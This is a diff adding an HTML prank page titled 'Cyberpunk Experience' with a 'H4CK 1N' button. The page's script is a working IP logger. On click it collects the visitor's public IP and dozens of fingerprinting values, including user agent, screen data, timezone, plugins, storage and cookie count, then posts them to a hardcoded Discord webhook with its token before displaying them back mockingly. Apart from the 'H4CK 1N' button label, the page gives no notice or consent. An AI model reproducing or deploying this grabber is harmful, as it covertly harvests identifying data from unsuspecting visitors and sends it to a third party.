@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cyberpunk Experience</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: #0d0d0d;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: hidden;
+      cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="cyan" d="M12 2l-8 8h6v12h4v-12h6z"/></svg>'), auto;
+      font-family: 'Courier New', monospace;
+    }
+    .particles {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent;
+      z-index: 0;
+    }
+    .enter-btn {
+      transition: all 0.3s ease;
+      transform: scale(1);
+      box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
+    }
+    .enter-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 25px rgba(0, 255, 255, 1);
+      background-color: #ff007a;
+    }
+    #info-page {
+      min-height: 400vh;
+      background: url('https://media.giphy.com/media/3o7btPCcdNniyf0ArS/giphy.gif') repeat center center fixed;
+      background-size: cover;
+    }
+    .info-item {
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.5s ease forwards;
+    }
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body class="text-cyan-300">
+  <canvas id="particles" class="particles"></canvas>
+  <audio id="bg-music" loop src="https://www.myinstants.com/media/sounds/trololo.mp3"></audio>
+  <div id="home" class="flex flex-col items-center justify-center min-h-screen z-10">
+    <h1 class="text-5xl md:text-7xl font-bold mb-8 animate-pulse text-neon-pink">CYB3RPUNK C0R3</h1>
+    <button id="enter-btn" class="enter-btn bg-cyan-500 text-black px-10 py-5 rounded-lg shadow-lg text-2xl">H4CK 1N</button>
+    <button id="music-toggle" class="mt-6 bg-gray-900 text-cyan-300 px-6 py-3 rounded-lg border border-cyan-500">T0ggl3 Tr0ll J4ms</button>
+  </div>
+  <div id="info-page" class="hidden max-w-4xl mx-auto p-8">
+    <h1 class="text-4xl md:text-6xl font-bold mb-12 text-center text-neon-pink">ur 1nf0rm4t13 l1l b0z0</h1>
+    <div id="user-info" class="grid grid-cols-1 md:grid-cols-2 gap-6"></div>
+  </div>
+
+  <script>
+    // Particle animation
+    const canvas = document.getElementById('particles');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    let particles = [];
+    class Particle {
+      constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 4 + 1;
+        this.speedX = Math.random() * 2 - 1;
+        this.speedY = Math.random() * 2 - 1;
+      }
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.size > 0.2) this.size -= 0.05;
+      }
+      draw() {
+        ctx.fillStyle = 'rgba(0, 255, 255, 0.7)';
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+    function initParticles() {
+      for (let i = 0; i < 150; i++) {
+        particles.push(new Particle());
+      }
+    }
+    function animateParticles() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      for (let i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+        if (particles[i].size <= 0.2) {
+          particles.splice(i, 1);
+          i--;
+          particles.push(new Particle());
+        }
+      }
+      requestAnimationFrame(animateParticles);
+    }
+    initParticles();
+    animateParticles();
+
+    // Music control
+    const music = document.getElementById('bg-music');
+    const musicToggle = document.getElementById('music-toggle');
+    musicToggle.addEventListener('click', () => {
+      if (music.paused) {
+        music.play();
+        musicToggle.textContent = 'P4us3 Tr0ll J4ms';
+      } else {
+        music.pause();
+        musicToggle.textContent = 'Pl4y Tr0ll J4ms';
+      }
+    });
+
+    // User data collection and display
+    const enterBtn = document.getElementById('enter-btn');
+    enterBtn.addEventListener('click', async () => {
+      // Play music only after clicking H4CK 1N
+      music.play().catch(err => console.error('Audio play error:', err));
+      const ipResponse = await fetch('https://api.ipify.org?format=json').then(res => res.json()).catch(() => ({ ip: 'N/A' }));
+      const userData = {
+        IPAddress: ipResponse.ip,
+        Timestamp: new Date().toISOString(),
+        UserAgent: navigator.userAgent,
+        Platform: navigator.platform,
+        Language: navigator.language,
+        ScreenWidth: window.screen.width,
+        ScreenHeight: window.screen.height,
+        WindowWidth: window.innerWidth,
+        WindowHeight: window.innerHeight,
+        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        Referrer: document.referrer,
+        URL: window.location.href,
+        Title: document.title,
+        TouchSupport: 'ontouchstart' in window,
+        WebGL: !!window.WebGLRenderingContext,
+        Connection: navigator.connection ? {
+          EffectiveType: navigator.connection.effectiveType,
+          Downlink: navigator.connection.downlink,
+          RTT: navigator.connection.rtt
+        } : 'N/A',
+        Languages: navigator.languages.join(', '),
+        HardwareConcurrency: navigator.hardwareConcurrency,
+        DeviceMemory: navigator.deviceMemory || 'N/A',
+        Vendor: navigator.vendor,
+        AppVersion: navigator.appVersion,
+        CookiesEnabled: navigator.cookieEnabled,
+        OnlineStatus: navigator.onLine,
+        DoNotTrack: navigator.doNotTrack,
+        ScreenAvailWidth: window.screen.availWidth,
+        ScreenAvailHeight: window.screen.availHeight,
+        Orientation: window.screen.orientation ? window.screen.orientation.type : 'N/A',
+        MaxTouchPoints: navigator.maxTouchPoints || 'N/A',
+        WebkitTemporaryStorage: navigator.webkitTemporaryStorage ? 'Supported' : 'Not Supported',
+        ServiceWorkerStatus: 'serviceWorker' in navigator ? 'Supported' : 'Not Supported',
+        PerformanceTiming: window.performance.timing ? JSON.stringify(window.performance.timing) : 'N/A',
+        MemoryInfo: window.performance.memory ? JSON.stringify({
+          totalJSHeapSize: window.performance.memory.totalJSHeapSize,
+          usedJSHeapSize: window.performance.memory.usedJSHeapSize,
+          jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit
+        }) : 'N/A',
+        StorageQuota: navigator.storage && navigator.storage.estimate ? (await navigator.storage.estimate().then(s => ({ quota: s.quota, usage: s.usage })).catch(() => 'N/A')) : 'N/A',
+        ScreenPixelDepth: window.screen.pixelDepth || 'N/A',
+        DeviceOrientation: 'DeviceOrientationEvent' in window ? 'Supported' : 'Not Supported',
+        DeviceMotion: 'DeviceMotionEvent' in window ? 'Supported' : 'Not Supported',
+        Geolocation: 'geolocation' in navigator ? 'Supported' : 'Not Supported',
+        BrowserName: navigator.appName || 'N/A',
+        BrowserCodeName: navigator.appCodeName || 'N/A',
+        Product: navigator.product || 'N/A',
+        ProductSub: navigator.productSub || 'N/A',
+        Plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : 'N/A',
+        MimeTypes: navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type).join(', ') : 'N/A',
+        ColorGamut: window.matchMedia('(color-gamut: srgb)') ? 'sRGB' : 'N/A',
+        DynamicRange: window.matchMedia('(dynamic-range: high)') ? 'High' : 'Standard',
+        PointerSupport: window.matchMedia('(pointer: fine)') ? 'Fine' : 'Coarse/None',
+        HoverSupport: window.matchMedia('(hover: hover)') ? 'Supported' : 'Not Supported',
+        AnyHover: window.matchMedia('(any-hover: hover)') ? 'Supported' : 'Not Supported',
+        AnyPointer: window.matchMedia('(any-pointer: fine)') ? 'Fine' : 'Coarse/None',
+        PrefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)') ? 'Reduce' : 'No Preference',
+        PrefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)') ? 'Dark' : 'Light',
+        ForcedColors: window.matchMedia('(forced-colors: active)') ? 'Active' : 'None',
+        InvertedColors: window.matchMedia('(inverted-colors: inverted)') ? 'Inverted' : 'None',
+        DisplayMode: navigator.standalone ? 'Standalone' : 'Browser',
+        CookieCount: document.cookie ? document.cookie.split(';').length : 0,
+        WindowOuterWidth: window.outerWidth,
+        WindowOuterHeight: window.outerHeight,
+        ScreenLeft: window.screenLeft || window.screenX,
+        ScreenTop: window.screenTop || window.screenY,
+        Email: 'N/A (Cannot access without user input)'
+      };
+
+      // Send to Discord webhook
+      const webhookUrl = 'https://discord.com/api/webhooks/1395330262061285478/J66jvDGT6lp9LhtK0Vil2hMmVFIAQsobWOrv8kmzGL_uiTDPDvx9DS8FdgsYQXY5rvdo';
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: JSON.stringify(userData, null, 2) })
+      }).catch(err => console.error('Webhook error:', err));
+
+      // Display info page
+      document.getElementById('home').style.display = 'none';
+      document.getElementById('info-page').classList.remove('hidden');
+      document.getElementById('info-page').style.display = 'block';
+      const userInfoDiv = document.getElementById('user-info');
+      userInfoDiv.innerHTML = ''; // Clear previous content
+      let delay = 0;
+      for (const [key, value] of Object.entries(userData)) {
+        const div = document.createElement('div');
+        div.className = 'info-item bg-gray-900 p-6 rounded-lg shadow-lg mb-6 border border-cyan-500';
+        div.style.animationDelay = `${delay}s`;
+        div.innerHTML = `<h2 class="text-xl font-semibold text-cyan-400">${key}</h2><p class="text-gray-300">${JSON.stringify(value)}</p>`;
+        userInfoDiv.appendChild(div);
+        delay += 0.2; // Stagger animation
+      }
+      // Scroll to top of info page
+      window.scrollTo(0, 0);
+    });
+
+    // Responsive canvas resize
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  </script>
+</body>
+</html>
